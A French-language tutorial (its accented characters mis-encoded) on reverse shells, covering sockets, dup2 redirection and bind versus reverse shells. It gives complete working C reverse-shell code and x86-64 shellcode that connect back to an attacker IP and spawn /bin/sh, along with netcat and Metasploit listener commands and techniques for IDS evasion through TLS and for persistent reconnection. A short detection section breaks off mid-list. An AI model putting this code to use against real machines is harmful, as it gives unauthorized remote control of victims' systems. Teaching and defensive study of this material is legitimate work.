# Cours : Reverse Shell - Connexion Inverse

## 1. Introduction - Communication RÃ©seau

### 1.1 Shell Normal vs Reverse Shell

**Shell Normal** (accÃ¨s physique) :
```ascii
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Utilisateur â”‚  Tape au clavier
â”‚     ğŸ‘¤      â”‚  Voit l'Ã©cran
â”‚             â”‚
â”‚  Terminal   â”‚  â† Shell local
â”‚  $ whoami   â”‚
â”‚  user       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Reverse Shell** (accÃ¨s distant) :
```ascii
ATTAQUANT                           VICTIME
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Ã‰coute     â”‚ â†â”€â”€Connectionâ”€â”€    â”‚ Connecte    â”‚
â”‚  nc -l 4444 â”‚                    â”‚ vers        â”‚
â”‚      â†“      â”‚                    â”‚ attaquant   â”‚
â”‚  ReÃ§oit     â”‚ â†â”€â”€â”€â”€â”€Shellâ”€â”€â”€â”€â”€â”€  â”‚ /bin/sh     â”‚
â”‚  shell      â”‚                    â”‚             â”‚
â”‚  $ whoami   â”‚ â”€â”€Commandesâ”€â”€â”€â”€â”€â†’  â”‚ ExÃ©cute     â”‚
â”‚  root       â”‚ â†â”€â”€RÃ©sultatsâ”€â”€â”€â”€â”€  â”‚ Renvoie     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Pourquoi "Reverse" ?**

Normalement, le **client** se connecte au **serveur**.
Ici, c'est l'inverse : **la victime se connecte Ã  l'attaquant**.

## 2. Les Sockets - PrÃ©requis RÃ©seau

### 2.1 Qu'est-ce qu'un Socket ?

Un **socket** est un point de communication rÃ©seau (comme une prise Ã©lectrique pour le rÃ©seau).

```ascii
ORDINATEUR A              RÃ©seau              ORDINATEUR B
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                            â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Programme   â”‚                            â”‚  Programme   â”‚
â”‚      â†“       â”‚                            â”‚      â†“       â”‚
â”‚   Socket 1   â”‚ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• â”‚   Socket 2   â”‚
â”‚  (IP:Port)   â”‚       TCP/IP              â”‚  (IP:Port)   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
192.168.1.10:4444                           192.168.1.20:8080
```

**Socket = IP + Port**
- **IP** : Identifie la machine (adresse de la maison)
- **Port** : Identifie l'application (numÃ©ro d'appartement)

### 2.2 CrÃ©er un Socket en C

```c
int sock = socket(AF_INET, SOCK_STREAM, 0);
                   â”‚        â”‚          â”‚
                   â”‚        â”‚          â””â”€ Protocole (0 = auto)
                   â”‚        â””â”€ Type : STREAM = TCP
                   â””â”€ Famille : INET = IPv4
```

**Que fait socket()** ?

```ascii
AVANT socket() :

Descripteurs de fichiers :
â”Œâ”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”
â”‚ 0 â”‚ stdinâ”‚
â”‚ 1 â”‚stdoutâ”‚
â”‚ 2 â”‚stderrâ”‚
â””â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”˜

APRÃˆS sock = socket(...) :

â”Œâ”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”
â”‚ 0 â”‚ stdinâ”‚
â”‚ 1 â”‚stdoutâ”‚
â”‚ 2 â”‚stderrâ”‚
â”‚ 3 â”‚socketâ”‚  â† Nouveau file descriptor
â””â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”˜
    â†‘
  sock = 3

Le socket est comme un fichier !
read(sock, ...) / write(sock, ...)
```

### 2.3 Structure sockaddr_in

```c
struct sockaddr_in {
    short sin_family;        // AF_INET
    unsigned short sin_port; // Port (en network byte order)
    struct in_addr sin_addr; // Adresse IP
    char sin_zero[8];        // Padding
};
```

**Remplir la structure** :

```c
struct sockaddr_in server;
server.sin_family = AF_INET;
server.sin_port = htons(4444);  // htons = host to network short
server.sin_addr.s_addr = inet_addr("10.0.0.1");
```

**Visualisation** :

```ascii
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  struct sockaddr_in server          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  sin_family : AF_INET (2)           â”‚  2 bytes
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  sin_port : 4444                    â”‚  2 bytes
â”‚  (0x115C en network byte order)    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  sin_addr : 10.0.0.1                â”‚  4 bytes
â”‚  (0x0A000001)                       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  sin_zero : \0\0\0\0\0\0\0\0        â”‚  8 bytes
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
Total : 16 bytes
```

## 3. Le Reverse Shell - ImplÃ©mentation DÃ©taillÃ©e

### 3.1 Architecture ComplÃ¨te

```ascii
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                  ATTAQUANT (10.0.0.1)                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Terminal 1 : Listener                              â”‚
â”‚  $ nc -lvp 4444                                      â”‚
â”‚  Listening on 0.0.0.0 4444                           â”‚
â”‚    â†“                                                 â”‚
â”‚  [Attend connexion...]                               â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                        â”‚
                        â”‚ Internet/RÃ©seau
                        â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                VICTIME (192.168.1.50)                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Programme vulnÃ©rable exploitÃ©                       â”‚
â”‚    â†“                                                 â”‚
â”‚  Shellcode reverse shell s'exÃ©cute :                 â”‚
â”‚  â”œâ”€ socket()       : CrÃ©e un socket                  â”‚
â”‚  â”œâ”€ connect()      : Connecte vers 10.0.0.1:4444     â”‚
â”‚  â”œâ”€ dup2(sock, 0)  : Redirige stdin                  â”‚
â”‚  â”œâ”€ dup2(sock, 1)  : Redirige stdout                 â”‚
â”‚  â”œâ”€ dup2(sock, 2)  : Redirige stderr                 â”‚
â”‚  â””â”€ execve()       : Lance /bin/sh                   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                        â”‚
                        â†“ Connection Ã©tablie
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                  ATTAQUANT                           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  $ nc -lvp 4444                                      â”‚
â”‚  Connection from 192.168.1.50                        â”‚
â”‚  $ whoami                                            â”‚
â”‚  root                                                â”‚
â”‚  $ ls                                                â”‚
â”‚  secret.txt                                          â”‚
â”‚  $                                                   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 3.2 Code C Complet CommentÃ©

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
    // Ã‰TAPE 1 : CrÃ©er un socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    
    // Ã‰TAPE 2 : Configurer l'adresse de l'attaquant
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);                    // Port de l'attaquant
    server.sin_addr.s_addr = inet_addr("10.0.0.1");  // IP de l'attaquant
    
    // Ã‰TAPE 3 : Se connecter Ã  l'attaquant
    connect(sock, (struct sockaddr *)&server, sizeof(server));
    
    // Ã‰TAPE 4 : Rediriger stdin, stdout, stderr vers le socket
    dup2(sock, 0);  // stdin  â†’ socket
    dup2(sock, 1);  // stdout â†’ socket
    dup2(sock, 2);  // stderr â†’ socket
    
    // Ã‰TAPE 5 : Lancer un shell
    execve("/bin/sh", NULL, NULL);
    
    return 0;
}
```

### 3.3 Comprendre dup2() - La Redirection

**dup2()** duplique un file descriptor vers un autre.

```ascii
AVANT dup2(sock, 0) :

File Descriptors :
â”Œâ”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 0 â”‚ stdin    â”‚  â† Lit depuis clavier
â”‚ 1 â”‚ stdout   â”‚  â† Ã‰crit vers Ã©cran
â”‚ 2 â”‚ stderr   â”‚  â† Erreurs vers Ã©cran
â”‚ 3 â”‚ socket   â”‚  â† ConnectÃ© au rÃ©seau
â””â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

APRÃˆS dup2(sock, 0) :

â”Œâ”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 0 â”‚ socket   â”‚  â† stdin redirigÃ© vers socket !
â”‚ 1 â”‚ stdout   â”‚
â”‚ 2 â”‚ stderr   â”‚
â”‚ 3 â”‚ socket   â”‚
â””â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

APRÃˆS dup2(sock, 1) et dup2(sock, 2) :

â”Œâ”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 0 â”‚ socket   â”‚  â† Tout redirigÃ©
â”‚ 1 â”‚ socket   â”‚     vers le socket
â”‚ 2 â”‚ socket   â”‚
â”‚ 3 â”‚ socket   â”‚
â””â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

RÃ‰SULTAT :
- Quand /bin/sh lit stdin  â†’ Lit depuis socket (attaquant)
- Quand /bin/sh Ã©crit stdout â†’ Ã‰crit vers socket (attaquant)
- Tout passe par le rÃ©seau !
```

**Visualisation du Flux** :

```ascii
ATTAQUANT tape "whoami" :

ATTAQUANT                          VICTIME
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ nc -l 4444   â”‚                   â”‚  /bin/sh     â”‚
â”‚ $ whoami     â”‚ â”€â”€Socket 3â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚ stdin (fd 0) â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                   â”‚      â†“       â”‚
                                   â”‚   ExÃ©cute    â”‚
                                   â”‚      â†“       â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                   â”‚ stdout (fd 1)â”‚
â”‚ nc -l 4444   â”‚ â†â”€â”€Socket 3â”€â”€â”€â”€â”€â”€â”€â”€â”‚ "root\n"     â”‚
â”‚ root         â”‚                   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Les donnÃ©es transitent via le socket dans les DEUX sens
```

## 4. Reverse Shell vs Bind Shell

### 4.1 Bind Shell

La **victime Ã©coute** et l'**attaquant se connecte**.

```ascii
VICTIME (192.168.1.50)            ATTAQUANT
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ bind(4444)   â”‚ â† Ã‰coute port    â”‚              â”‚
â”‚ listen()     â”‚                  â”‚              â”‚
â”‚ accept()     â”‚                  â”‚              â”‚
â”‚   â†“          â”‚                  â”‚   â†“          â”‚
â”‚ Attend...    â”‚  â†â”€â”€connect()â”€â”€  â”‚ nc IP 4444   â”‚
â”‚   â†“          â”‚                  â”‚   â†“          â”‚
â”‚ /bin/sh      â”‚  â†â”€â”€commandesâ”€â”€  â”‚ whoami       â”‚
â”‚   â†“          â”‚  â”€â”€rÃ©sultatsâ”€â”€â†’  â”‚ root         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

âŒ PROBLÃˆME : Firewall entrant bloque souvent
```

### 4.2 Reverse Shell

La **victime se connecte** vers l'**attaquant**.

```ascii
ATTAQUANT                         VICTIME (192.168.1.50)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ nc -l 4444   â”‚ â† Ã‰coute         â”‚              â”‚
â”‚   â†“          â”‚                  â”‚ ExploitÃ©     â”‚
â”‚ Attend...    â”‚  â”€â”€connect()â”€â”€â”€  â”‚ connect(IP)  â”‚
â”‚   â†“          â”‚                  â”‚   â†“          â”‚
â”‚ ReÃ§oit shell â”‚  â†â”€â”€â”€â”€/bin/shâ”€â”€  â”‚ dup2()       â”‚
â”‚ $ whoami     â”‚  â”€â”€commandesâ”€â”€â†’  â”‚ execve()     â”‚
â”‚ root         â”‚  â†â”€â”€rÃ©sultatsâ”€â”€  â”‚              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

âœ… BYPASS : Firewall sortant moins strict
```

**Tableau Comparatif** :

| Aspect | Bind Shell | Reverse Shell |
|--------|------------|---------------|
| **Qui Ã©coute** | Victime | Attaquant |
| **Qui connecte** | Attaquant | Victime |
| **Firewall** | BloquÃ© souvent | Passe souvent |
| **NAT** | ProblÃ©matique | Fonctionne |
| **FurtivitÃ©** | Moins furtif | Plus furtif |

## 5. ImplÃ©mentation ComplÃ¨te - Ã‰tape par Ã‰tape

### 5.1 CÃ´tÃ© Attaquant : Le Listener

```bash
# MÃ©thode 1 : Netcat (nc)
nc -lvp 4444
   â”‚â”‚â”‚  â”‚
   â”‚â”‚â”‚  â””â”€ Port Ã  Ã©couter
   â”‚â”‚â””â”€ Verbose (affiche les connexions)
   â”‚â””â”€ Listen (mode Ã©coute)
   â””â”€ Keep listening (accepter plusieurs connexions)

# MÃ©thode 2 : Python
python3 -c 'import socket; s=socket.socket(); s.bind(("0.0.0.0",4444)); s.listen(1); c,a=s.accept(); [c.send(c.recv(1024)) for _ in iter(int, 1)]'

# MÃ©thode 3 : Metasploit
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
exploit
```

### 5.2 CÃ´tÃ© Victime : Le Code Complet

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // Ã‰TAPE 1 : CrÃ©er un socket TCP
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        return 1;  // Ã‰chec
    }
    
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // Ã‰TAPE 2 : Configurer l'adresse de destination
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    struct sockaddr_in attacker;
    attacker.sin_family = AF_INET;
    attacker.sin_port = htons(4444);  // Port de l'attaquant
    attacker.sin_addr.s_addr = inet_addr("10.0.0.1");  // IP attaquant
    
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // Ã‰TAPE 3 : Se connecter Ã  l'attaquant
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    if (connect(sock, (struct sockaddr *)&attacker, sizeof(attacker)) != 0) {
        return 1;  // Connexion Ã©chouÃ©e
    }
    
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // Ã‰TAPE 4 : Rediriger stdin/stdout/stderr
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    dup2(sock, 0);  // stdin  â†’ socket
    dup2(sock, 1);  // stdout â†’ socket
    dup2(sock, 2);  // stderr â†’ socket
    
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // Ã‰TAPE 5 : Lancer un shell
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
    
    return 0;
}
```

### 5.3 Flux de DonnÃ©es Complet

```ascii
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  SCÃ‰NARIO : L'attaquant tape "ls"                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

ATTAQUANT (10.0.0.1)           RÃ‰SEAU           VICTIME (192.168.1.50)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                               â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ nc -l 4444   â”‚                               â”‚              â”‚
â”‚ $ ls         â”‚ â”€â”                            â”‚              â”‚
â”‚ (tape)       â”‚  â”‚                            â”‚              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚                            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                  â”‚ Paquet TCP
                  â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                  â””â†’â”‚ "ls\n"           â”‚
                    â”‚ Source: attaquantâ”‚
                    â”‚ Dest: victime    â”‚
                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                              â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”        Socket (fd 3)          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              â”‚                               â”‚ ReÃ§oit "ls\n"â”‚
â”‚              â”‚                               â”‚      â†“       â”‚
â”‚              â”‚                               â”‚   stdin (0)  â”‚
â”‚              â”‚                               â”‚      â†“       â”‚
â”‚              â”‚                               â”‚   /bin/sh    â”‚
â”‚              â”‚                               â”‚   exÃ©cute ls â”‚
â”‚              â”‚                               â”‚      â†“       â”‚
â”‚              â”‚                               â”‚  stdout (1)  â”‚
â”‚              â”‚                               â”‚  "file1      â”‚
â”‚              â”‚                               â”‚   file2"     â”‚
â”‚              â”‚                               â”‚      â†“       â”‚
â”‚              â”‚        Paquet TCP             â”‚  Socket (3)  â”‚
â”‚              â”‚    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”‚      â”‚       â”‚
â”‚              â”‚  â†â”€â”‚ "file1\nfile2\n" â”‚â†â”€â”€â”€â”€â”€â”€â”˜      â”‚       â”‚
â”‚              â”‚    â”‚ Source: victime  â”‚              â”‚       â”‚
â”‚              â”‚    â”‚ Dest: attaquant  â”‚              â”‚       â”‚
â”‚              â”‚    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜              â”‚       â”‚
â”‚ ReÃ§oit :     â”‚                               â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â”‚ file1        â”‚
â”‚ file2        â”‚
â”‚ $            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Le shell distant fonctionne comme si l'attaquant
Ã©tait physiquement devant la machine !
```

## 6. Shellcode Reverse Shell

### 6.1 En Assembleur x86-64

```asm
global _start

_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    xor rax, rax
    mov al, 41          ; Syscall socket = 41
    xor rdi, rdi
    mov dil, 2          ; AF_INET = 2
    xor rsi, rsi
    mov sil, 1          ; SOCK_STREAM = 1
    xor rdx, rdx        ; Protocol = 0
    syscall
    mov rdi, rax        ; Sauver socket dans RDI
    
    ; struct sockaddr_in sur la stack
    xor rax, rax
    push rax            ; sin_zero
    push rax
    mov dword [rsp-4], 0x0100007f   ; sin_addr = 127.0.0.1
    mov word [rsp-6], 0x5c11        ; sin_port = 4444 (network order)
    sub rsp, 8
    
    ; connect(sock, &addr, sizeof(addr))
    mov rsi, rsp        ; RSI = adresse struct
    mov al, 42          ; Syscall connect = 42
    mov dl, 16          ; sizeof(sockaddr_in)
    syscall
    
    ; dup2(sock, 0/1/2)
    mov rsi, rdi        ; RSI = socket
    xor rdi, rdi        ; RDI = 0 (stdin)
    mov al, 33          ; Syscall dup2
    syscall
    
    inc rdi             ; RDI = 1 (stdout)
    mov al, 33
    syscall
    
    inc rdi             ; RDI = 2 (stderr)
    mov al, 33
    syscall
    
    ; execve("/bin/sh", NULL, NULL)
    xor rax, rax
    push rax
    mov rbx, 0x68732f2f6e69622f  ; "//bin/sh"
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov al, 59
    syscall
```

### 6.2 Compilation du Shellcode

```bash
# Assembler
nasm -f elf64 reverse_shell.asm -o reverse_shell.o

# Lier
ld reverse_shell.o -o reverse_shell

# Extraire le shellcode
objcopy -O binary reverse_shell shellcode.bin

# Afficher en bytes
xxd -i shellcode.bin
```

## 7. Techniques AvancÃ©es

### 7.1 Reverse Shell ChiffrÃ© (SSL/TLS)

```ascii
PROBLÃˆME : Reverse shell en clair = dÃ©tectable par IDS

SOLUTION : Chiffrer avec OpenSSL

ATTAQUANT :
openssl s_server -key key.pem -cert cert.pem -port 4444

VICTIME :
connect() + SSL_connect()
   â†“
Tout le trafic est chiffrÃ©

RÃ‰SULTAT :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Paquet rÃ©seau capturÃ© :             â”‚
â”‚ 0x8F 0x2A 0xC1 0xB4 ...            â”‚
â”‚ (donnÃ©es chiffrÃ©es)                 â”‚
â”‚                                     â”‚
â”‚ IDS ne peut pas dÃ©tecter "whoami"   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 7.2 Persistence du Reverse Shell

```ascii
PROBLÃˆME : Si connexion coupÃ©e, shell perdu

SOLUTION : Boucle de reconnexion

while (1) {
    sock = socket(...);
    if (connect(sock, ...) == 0) {
        // Shell
        break;
    }
    sleep(60);  // Attendre 60s avant rÃ©essayer
}

TIMELINE :

0s    : PremiÃ¨re tentative â†’ Connexion OK
       â†’ Shell actif
       
300s  : Connexion coupÃ©e
       â†’ Tentative reconnexion
       
360s  : Reconnexion OK
       â†’ Shell rÃ©tabli

L'attaquant garde toujours accÃ¨s !
```

## 8. DÃ©tection et Protection

### 8.1 Signes d'un Reverse Shell

```ascii
INDICATEURS :

1. Connexion sortante suspecte
   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
   â”‚ netstat -an | grep ESTABLISHED  â”‚
   â”‚ tcp   0   0 192.168.1.50:54321 10.0.0.1:4444 ESTABLISHED
   â”‚                â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
   â”‚                  Machine        IP externe
   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

2. Processus inattendu
   â”œâ”€ /bin/sh avec parent suspect
   â”œâ”€ Connexion rÃ©seau sur /bin/sh
   
3. File descriptors anormaux
